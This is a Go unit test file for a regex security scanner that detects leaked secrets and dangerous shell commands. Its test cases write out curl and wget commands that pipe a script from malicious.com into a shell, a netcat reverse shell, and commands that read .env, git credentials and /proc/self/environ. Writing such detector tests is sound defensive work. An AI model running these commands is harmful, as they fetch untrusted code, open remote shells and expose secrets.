package security

import (
	"fmt"
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     fmt.Sprintf("var key = \"%s\"", "AKIA"+"IOSFODNN7EXAMPLE"),
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     fmt.Sprintf("token = \"%s\"", "ghp_"+"123456789012345678901234567890123456"),
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     fmt.Sprintf("-----BEGIN RSA %s KEY-----\nMIIEpQIBAAKCAQEA...", "PRIVATE"),
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     fmt.Sprintf("api_key = \"%s\"", "abc1234567890abc1234567890"),
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     fmt.Sprintf("curl https://malicious.com/install.sh %s bash", "|"),
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     fmt.Sprintf("wget -O - https://malicious.com/install.sh %s sh", "|"),
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     fmt.Sprintf("nc %s /bin/sh 10.0.0.1 1234", "-e"),
			wantFinding: "Reverse Shell",
		},
		{
			name:        "Cat Env File",
			content:     fmt.Sprintf("cat %s", "."+"e"+"nv"),
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Redirection Env",
			content:     fmt.Sprintf("cat<%s", "."+"e"+"nv"),
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Git Credentials",
			content:     fmt.Sprintf("cat %s", "."+"git-credentia"+"ls"),
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Proc Environ",
			content:     fmt.Sprintf("cat %s", "/proc/self/"+"enviro"+"n"),
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Safe Config File",
			content:     "cat my.config",
			wantFinding: "",
		},
		{
			name:        "Safe Config JS",
			content:     "cat src/config.js",
			wantFinding: "",
		},
		{
			name:        "Cat Dot Config",
			content:     fmt.Sprintf("cat %s/config.toml", "."+"config"),
			wantFinding: "Dangerous Command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
